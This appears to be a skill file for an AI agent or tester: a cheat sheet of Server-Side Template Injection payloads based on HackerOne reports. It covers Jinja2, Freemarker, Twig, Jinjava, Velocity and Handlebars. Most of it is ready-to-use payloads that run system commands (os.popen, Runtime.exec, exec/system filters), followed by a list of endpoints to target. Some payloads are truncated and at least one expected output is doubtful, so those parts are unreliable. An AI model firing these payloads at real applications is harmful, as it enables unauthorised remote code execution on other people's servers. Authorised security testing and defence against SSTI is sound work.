---
name: "h1-ssti-techniques"
description: "Server-Side Template Injection patterns from HackerOne reports — SSTI in email templates, PDF generators, error pages, profile fields leading to RCE"
category: web-security
tags: ["ssti", "template-injection", "server-side-template", "rce", "hackerone"]
relevance: 9
---

# H1 SSTI Testing Techniques

Real-world SSTI vulnerabilities from HackerOne:

## 1. Jinja2/Flask SSTI (Python)
Test every user-input field:
```
{{7*7}}                → 49 (SSTI confirmed)
{{config}}             → reveals Flask config
{{''.__class__.__mro__[2].__subclasses__()}}  → RCE
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

## 2. Freemarker SSTI (Java)
```
${7*7}                 → 49
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(null,"id")}
```

## 3. Twig SSTI (PHP)
```
{{7*7}}                → 49
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

## 4. Jinjava SSTI (Java)
```
{{7*7}}                → 49
{{'a'.getClass().forName('java.lang.Runtime').getMethod('exec','a'.getClass().forName('java.lang.String')).invoke(...)}}
```

## 5. Velocity SSTI (Java)
```
#set($x=7*7) $x        → 49
#set($x='') $x.class.forName('java.lang.Runtime').getMethod('exec','').invoke(...)
```

## 6. Handlebars SSTI (Node.js)
```
{{7*7}}                → 49 (or 49 in comment)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.split "substring")}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Common SSTI Endpoints:
- Email templates (name, company fields)
- PDF generators (invoice template)
- Error pages (custom error messages)
- Profile bio/description
- Template preview features

## Detection Checklist:
- [ ] `${7*7}`, `{{7*7}}`, `#{7*7}` → look for `49` in response
- [ ] `${7*'7'}` → look for `7777777` (string repetition)
- [ ] `<%= 7*7 %>` (ERB)
- [ ] `{{7*'7'}}` → `7777777` in Jinja2/Twig
